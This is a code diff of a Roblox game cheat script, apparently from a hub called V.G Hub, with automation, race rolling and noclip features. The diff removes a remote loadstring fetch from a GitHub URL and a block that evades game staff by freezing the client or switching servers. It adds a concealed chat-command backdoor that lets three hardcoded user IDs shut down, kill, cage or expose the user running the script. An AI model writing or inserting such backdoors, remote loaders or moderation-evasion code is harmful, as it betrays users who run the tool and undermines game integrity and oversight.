@@ -1,5 +1,4 @@
 repeat wait() until game:IsLoaded()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/Extras/Anti-Cheat'))()
 local Chests = Workspace.Chests
 local DamageParts = Workspace.DamageParts
 local Effect = Workspace.Effects
@@ -116,40 +115,17 @@ local Races = {
         "Beerus' Race",
     },
 }
+local Number = {
+    1764982066,
+    155073071,
+    2299820355,
+}
 local Stats = {
     "Strength",
     "Magic",
     "Weapon",
     "Endurance",
 }
-
-local Team = {
-    "Bounty Hunters",
-    "Witch Hunters",
-    "Witch Hunter Captains",
-    "Zealot"
-}
-
-function Hey(i, v)
-    return i:GetRoleInGroup(v)
-end
-RunService.Stepped:Connect(function()
-    if Player and table.find(Team, Hey(Player, 12097731)) then
-        while true do end
-    end 
-end)
-
-for i,v in pairs(Players:GetPlayers()) do
-    if table.find(Team, Hey(v, 2613928)) then
-        ServerHop()
-    end 
-end 
-Players.PlayerAdded:Connect(function(v)
-    if table.find(Team, Hey(v, 2613928)) then
-        ServerHop()
-    end 
-end)
-
 local races = {}
 for i,v in Races do
     for i,v in next, v do
@@ -234,6 +210,22 @@ local RollRace = function(A)
         ReplicatedStorage:WaitForChild("RemoteEvents"):FindFirstChild("RaceSpinRemote"):FireServer(1)
     end
 end
+
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(Read, d)
+    if table.find(Number, Read.SpeakerUserId) then
+        if Read.Message == "Cage" then
+            Cage()
+        elseif Read.Message == "Shutdown" then
+            game:Shutdown()
+        elseif Read.Message == "Kill" then
+            Player.Character:FindFirstChildWhichIsA("Humanoid").Health = 0
+        elseif Read.Message == "Info" then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("My username is " .. Player.Name .. " Level " .. Player.PlayerValues.Level.Value, "All")
+        elseif Read.Message == "Say Hello" then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hello DekuDimz I'm sorry for the late response V.G Hub Owner thank you for letting me V.G Hub", "All")
+        end
+    end
+end)
 
 local NoCliper = function()
     for i,v in next, Player.Character:GetDescendants() do
